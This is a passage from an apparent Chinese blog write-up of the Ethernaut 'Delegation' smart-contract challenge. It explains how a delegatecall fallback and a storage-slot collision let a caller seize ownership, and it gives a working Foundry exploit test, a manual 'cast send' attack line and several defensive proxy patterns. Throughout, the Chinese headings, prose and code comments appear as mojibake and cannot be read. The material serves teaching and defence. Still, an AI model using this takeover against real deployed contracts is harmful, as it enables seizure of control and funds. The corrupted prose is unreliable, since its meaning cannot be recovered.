ä»£ç†æ¨¡å¼é£é™©</strong> - äº†è§£å‡çº§æ¨¡å¼çš„å®‰å…¨éšæ‚£</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Delegate &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _owner) &#123;</span><br><span class=\"line\">        owner = _owner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function pwn() public &#123;</span><br><span class=\"line\">        owner = msg.sender;  // ğŸ¯ ç›®æ ‡å‡½æ•°ï¼šä¼šä¿®æ”¹ owner</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Delegation &#123;</span><br><span class=\"line\">    address public owner;      // ğŸš¨ å­˜å‚¨æ§½ 0</span><br><span class=\"line\">    Delegate delegate;         // ğŸš¨ å­˜å‚¨æ§½ 1</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _delegateAddress) &#123;</span><br><span class=\"line\">        delegate = Delegate(_delegateAddress);</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    fallback() external &#123;</span><br><span class=\"line\">        // ğŸš¨ å±é™©çš„ delegatecall</span><br><span class=\"line\">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class=\"line\">        if (result) &#123;</span><br><span class=\"line\">            this;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ ¸å¿ƒæ¦‚å¿µï¼šdelegatecall-vs-call\"><a href=\"#æ ¸å¿ƒæ¦‚å¿µï¼šdelegatecall-vs-call\" class=\"headerlink\" title=\"æ ¸å¿ƒæ¦‚å¿µï¼šdelegatecall vs call\"></a>æ ¸å¿ƒæ¦‚å¿µï¼šdelegatecall vs call</h3><table>\n<thead>\n<tr>\n<th>è°ƒç”¨æ–¹å¼</th>\n<th>æ‰§è¡Œä¸Šä¸‹æ–‡</th>\n<th>å­˜å‚¨ä¿®æ”¹</th>\n<th>msg.sender</th>\n<th>ä½¿ç”¨åœºæ™¯</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>call</strong></td>\n<td>è¢«è°ƒç”¨åˆçº¦</td>\n<td>è¢«è°ƒç”¨åˆçº¦</td>\n<td>è°ƒç”¨åˆçº¦åœ°å€</td>\n<td>æ™®é€šå¤–éƒ¨è°ƒç”¨</td>\n</tr>\n<tr>\n<td><strong>delegatecall</strong></td>\n<td>è°ƒç”¨åˆçº¦</td>\n<td>è°ƒç”¨åˆçº¦</td>\n<td>åŸå§‹è°ƒç”¨è€…</td>\n<td>ä»£ç†æ¨¡å¼ã€å‡çº§</td>\n</tr>\n</tbody></table>\n<h3 id=\"æ¼æ´åŸç†\"><a href=\"#æ¼æ´åŸç†\" class=\"headerlink\" title=\"æ¼æ´åŸç†\"></a>æ¼æ´åŸç†</h3><p><strong>delegatecall çš„å·¥ä½œæœºåˆ¶</strong>ï¼š</p>\n<ul>\n<li>æ‰§è¡Œ<strong>è¢«è°ƒç”¨åˆçº¦çš„ä»£ç </strong></li>\n<li>ä½¿ç”¨<strong>è°ƒç”¨åˆçº¦çš„å­˜å‚¨</strong></li>\n<li>ä¿æŒ<strong>åŸå§‹çš„ msg.sender</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// å½“ Delegation åˆçº¦æ‰§è¡Œ delegatecall æ—¶ï¼š</span><br><span class=\"line\">delegate.delegatecall(abi.encodeWithSignature(&quot;pwn()&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">// å®é™…æ‰§è¡Œï¼š</span><br><span class=\"line\">// 1. è¿è¡Œ Delegate.pwn() çš„ä»£ç </span><br><span class=\"line\">// 2. ä½†æ˜¯åœ¨ Delegation åˆçº¦çš„å­˜å‚¨ä¸Šä¸‹æ–‡ä¸­</span><br><span class=\"line\">// 3. owner = msg.sender; ä¿®æ”¹çš„æ˜¯ Delegation.owner (å­˜å‚¨æ§½0)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å­˜å‚¨æ§½å¸ƒå±€åˆ†æ\"><a href=\"#å­˜å‚¨æ§½å¸ƒå±€åˆ†æ\" class=\"headerlink\" title=\"å­˜å‚¨æ§½å¸ƒå±€åˆ†æ\"></a>å­˜å‚¨æ§½å¸ƒå±€åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Delegate åˆçº¦å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">// æ§½ 0: address owner</span><br><span class=\"line\"></span><br><span class=\"line\">// Delegation åˆçº¦å­˜å‚¨å¸ƒå±€  </span><br><span class=\"line\">// æ§½ 0: address owner     â† è¿™ä¸ªä¼šè¢« delegatecall ä¿®æ”¹ï¼</span><br><span class=\"line\">// æ§½ 1: Delegate delegate</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ”»å‡»è·¯å¾„\"><a href=\"#æ”»å‡»è·¯å¾„\" class=\"headerlink\" title=\"æ”»å‡»è·¯å¾„\"></a>æ”»å‡»è·¯å¾„</h3><ol>\n<li><strong>æ„é€ å‡½æ•°è°ƒç”¨æ•°æ®</strong> - ç¼–ç  <code>pwn()</code> å‡½æ•°é€‰æ‹©å™¨</li>\n<li><strong>è§¦å‘ fallback å‡½æ•°</strong> - å‘åˆçº¦å‘é€å¸¦æ•°æ®çš„äº¤æ˜“</li>\n<li><strong>æ‰§è¡Œ delegatecall</strong> - åœ¨ Delegation å­˜å‚¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œ <code>pwn()</code></li>\n<li><strong>è·å¾—æ§åˆ¶æƒ</strong> - <code>owner</code> è¢«è®¾ç½®ä¸ºæ”»å‡»è€…åœ°å€</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Delegation.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DelegationTest is Test &#123;</span><br><span class=\"line\">    Delegate public delegate;</span><br><span class=\"line\">    Delegation public delegation;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\">    address public deployer = makeAddr(&quot;deployer&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        vm.startPrank(deployer);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½² Delegate åˆçº¦</span><br><span class=\"line\">        delegate = new Delegate(deployer);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½² Delegation åˆçº¦</span><br><span class=\"line\">        delegation = new Delegation(address(delegate));</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDelegationExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;Initial owner:&quot;, delegation.owner());</span><br><span class=\"line\">        console.log(&quot;Attacker address:&quot;, attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ğŸ¯ å…³é”®æ”»å‡»ï¼šæ„é€  pwn() å‡½æ•°è°ƒç”¨</span><br><span class=\"line\">        bytes memory payload = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // é€šè¿‡ fallback å‡½æ•°è§¦å‘ delegatecall</span><br><span class=\"line\">        (bool success,) = address(delegation).call(payload);</span><br><span class=\"line\">        require(success, &quot;Attack failed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(delegation.owner(), attacker);</span><br><span class=\"line\">        console.log(&quot;New owner:&quot;, delegation.owner());</span><br><span class=\"line\">        console.log(&quot;Attack successful!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testUnderstandDelegatecall() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== Before Attack ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Delegation owner:&quot;, delegation.owner());</span><br><span class=\"line\">        console.log(&quot;Delegate owner:&quot;, delegate.owner());</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç›´æ¥è°ƒç”¨ delegate.pwn() åªä¼šä¿®æ”¹ delegate çš„å­˜å‚¨</span><br><span class=\"line\">        delegate.pwn();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== After direct call to Delegate.pwn() ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Delegation owner:&quot;, delegation.owner()); // ä¸å˜</span><br><span class=\"line\">        console.log(&quot;Delegate owner:&quot;, delegate.owner());     // å˜ä¸º attacker</span><br><span class=\"line\">        </span><br><span class=\"line\">        // é‡ç½®çŠ¶æ€</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        vm.prank(deployer);</span><br><span class=\"line\">        delegate = new Delegate(deployer);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // é€šè¿‡ delegatecall è°ƒç”¨ pwn()</span><br><span class=\"line\">        bytes memory payload = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">        (bool success,) = address(delegation).call(payload);</span><br><span class=\"line\">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== After delegatecall to pwn() ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Delegation owner:&quot;, delegation.owner()); // å˜ä¸º attacker!</span><br><span class=\"line\">        console.log(&quot;Delegate owner:&quot;, delegate.owner());     // ä¸å˜</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testFunctionSelector() public view &#123;</span><br><span class=\"line\">        // æ¼”ç¤ºå‡½æ•°é€‰æ‹©å™¨çš„è®¡ç®—</span><br><span class=\"line\">        bytes4 selector = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class=\"line\">        console.log(&quot;pwn() selector:&quot;);</span><br><span class=\"line\">        console.logBytes4(selector);</span><br><span class=\"line\">        </span><br><span class=\"line\">        bytes memory encoded = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">        console.log(&quot;Encoded call data:&quot;);</span><br><span class=\"line\">        console.logBytes(encoded);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ‰‹åŠ¨æ”»å‡»è„šæœ¬\"><a href=\"#æ‰‹åŠ¨æ”»å‡»è„šæœ¬\" class=\"headerlink\" title=\"æ‰‹åŠ¨æ”»å‡»è„šæœ¬\"></a>æ‰‹åŠ¨æ”»å‡»è„šæœ¬</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// å¦‚æœéœ€è¦æ‰‹åŠ¨æ”»å‡»ï¼Œå¯ä»¥ä½¿ç”¨ cast å‘½ä»¤</span><br><span class=\"line\">contract ManualAttack is Test &#123;</span><br><span class=\"line\">    function testManualAttack() public &#123;</span><br><span class=\"line\">        // 1. è®¡ç®—å‡½æ•°é€‰æ‹©å™¨</span><br><span class=\"line\">        bytes4 selector = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class=\"line\">        console.logBytes4(selector);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 2. ä½¿ç”¨ cast å‘é€äº¤æ˜“</span><br><span class=\"line\">        // cast send &lt;DELEGATION_ADDRESS&gt; &lt;SELECTOR&gt; --private-key &lt;YOUR_KEY&gt;</span><br><span class=\"line\">        // ä¾‹å¦‚ï¼šcast send 0x... 0xdd365b8b --private-key ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿è¡Œ Delegation æ”»å‡»æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract DelegationTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># é¢„æœŸè¾“å‡ºï¼š</span></span><br><span class=\"line\"><span class=\"comment\"># Initial owner: 0x... (deployer)</span></span><br><span class=\"line\"><span class=\"comment\"># Attacker address: 0x... (attacker) </span></span><br><span class=\"line\"><span class=\"comment\"># New owner: 0x... (attacker)</span></span><br><span class=\"line\"><span class=\"comment\"># Attack successful!</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-ä¸¥æ ¼çš„å­˜å‚¨å¸ƒå±€åŒ¹é…\"><a href=\"#1-ä¸¥æ ¼çš„å­˜å‚¨å¸ƒå±€åŒ¹é…\" class=\"headerlink\" title=\"1. ä¸¥æ ¼çš„å­˜å‚¨å¸ƒå±€åŒ¹é…\"></a>1. ä¸¥æ ¼çš„å­˜å‚¨å¸ƒå±€åŒ¹é…</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SafeProxy &#123;</span><br><span class=\"line\">    // âœ… ç¡®ä¿ä»£ç†å’Œå®ç°åˆçº¦æœ‰ç›¸åŒçš„å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">    address public owner;           // æ§½ 0</span><br><span class=\"line\">    address public implementation; // æ§½ 1</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner() &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;Not owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function upgrade(address newImplementation) public onlyOwner &#123;</span><br><span class=\"line\">        implementation = newImplementation;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    fallback() external &#123;</span><br><span class=\"line\">        address impl = implementation;</span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            // ä½¿ç”¨å†…è”æ±‡ç¼–è¿›è¡Œæ›´å®‰å…¨çš„ delegatecall</span><br><span class=\"line\">            calldatacopy(0, 0, calldatasize())</span><br><span class=\"line\">            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)</span><br><span class=\"line\">            returndatacopy(0, 0, returndatasize())</span><br><span class=\"line\">            </span><br><span class=\"line\">            switch result</span><br><span class=\"line\">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class=\"line\">            default &#123; return(0, returndatasize()) &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨-OpenZeppelin-çš„ä»£ç†æ¨¡å¼\"><a href=\"#2-ä½¿ç”¨-OpenZeppelin-çš„ä»£ç†æ¨¡å¼\" class=\"headerlink\" title=\"2. ä½¿ç”¨ OpenZeppelin çš„ä»£ç†æ¨¡å¼\"></a>2. ä½¿ç”¨ OpenZeppelin çš„ä»£ç†æ¨¡å¼</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &quot;@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol&quot;;</span><br><span class=\"line\">import &quot;@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureUpgradeableContract &#123;</span><br><span class=\"line\">    // ä½¿ç”¨ OpenZeppelin çš„æ ‡å‡†åŒ–ä»£ç†å®ç°</span><br><span class=\"line\">    // åŒ…å«å®Œæ•´çš„å®‰å…¨æ£€æŸ¥å’Œå­˜å‚¨éš”ç¦»</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-å‡½æ•°é€‰æ‹©å™¨ç™½åå•\"><a href=\"#3-å‡½æ•°é€‰æ‹©å™¨ç™½åå•\" class=\"headerlink\" title=\"3. å‡½æ•°é€‰æ‹©å™¨ç™½åå•\"></a>3. å‡½æ•°é€‰æ‹©å™¨ç™½åå•</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract RestrictedDelegation &#123;</span><br><span class=\"line\">    mapping(bytes4 =&gt; bool) public allowedSelectors;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        // åªå…è®¸ç‰¹å®šå‡½æ•°è¢« delegatecall</span><br><span class=\"line\">        allowedSelectors[bytes4(keccak256(&quot;safeFunction()&quot;))] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    fallback() external &#123;</span><br><span class=\"line\">        bytes4 selector = bytes4(msg.data);</span><br><span class=\"line\">        require(allowedSelectors[selector], &quot;Function not allowed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ‰§è¡Œ delegatecall</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-å­˜å‚¨æ§½éš”ç¦»\"><a href=\"#4-å­˜å‚¨æ§½éš”ç¦»\" class=\"headerlink\" title=\"4. å­˜å‚¨æ§½éš”ç¦»\"></a>4. å­˜å‚¨æ§½éš”ç¦»</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract IsolatedStorage &#123;</span><br><span class=\"line\">    // ä½¿ç”¨ EIP-1967 æ ‡å‡†å­˜å‚¨æ§½</span><br><span class=\"line\">    bytes32 private constant IMPLEMENTATION_SLOT = </span><br><span class=\"line\">        bytes32(uint256(keccak256(&#x27;eip1967.proxy.implementation&#x27;)) - 1);</span><br><span class=\"line\">    </span><br><span class=\"line\">    bytes32 private constant ADMIN_SLOT = </span><br><span class=\"line\">        bytes32(uint256(keccak256(&#x27;eip1967.proxy.admin&#x27;)) - 1);</span><br><span class=\"line\">    </span><br><span class=\"line\">    function _getImplementation() internal view returns (address) &#123;</span><br><span class=\"line\">        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function _setImplementation(address newImplementation) internal &#123;</span><br><span class=\"line\">        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = newImplementation;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"1-EVM-è°ƒç”¨ç±»å‹å¯¹æ¯”\"><a href=\"#1-EVM-è°ƒç”¨ç±»å‹å¯¹æ¯”\" class=\"headerlink\" title=\"1. EVM è°ƒç”¨ç±»å‹å¯¹æ¯”\"></a>1. EVM è°ƒç”¨ç±»å‹å¯¹æ¯”</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CallExample &#123;</span><br><span class=\"line\">    function demonstrateCalls(address target) public &#123;</span><br><span class=\"line\">        // 1. call - æ™®é€šå¤–éƒ¨è°ƒç”¨</span><br><span class=\"line\">        (bool success1,) = target.call(</span><br><span class=\"line\">            abi.encodeWithSignature(&quot;someFunction()&quot;)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 2. delegatecall - å§”æ‰˜è°ƒç”¨</span><br><span class=\"line\">        (bool success2,) = target.delegatecall(</span><br><span class=\"line\">            abi.encodeWithSignature(&quot;someFunction()&quot;)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 3. staticcall - åªè¯»è°ƒç”¨</span><br><span class=\"line\">        (bool success3,) = target.staticcall(</span><br><span class=\"line\">            abi.encodeWithSignature(&quot;viewFunction()&quot;)</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-å­˜å‚¨æ§½å†²çªç¤ºä¾‹\"><a href=\"#2-å­˜å‚¨æ§½å†²çªç¤ºä¾‹\" class=\"headerlink\" title=\"2. 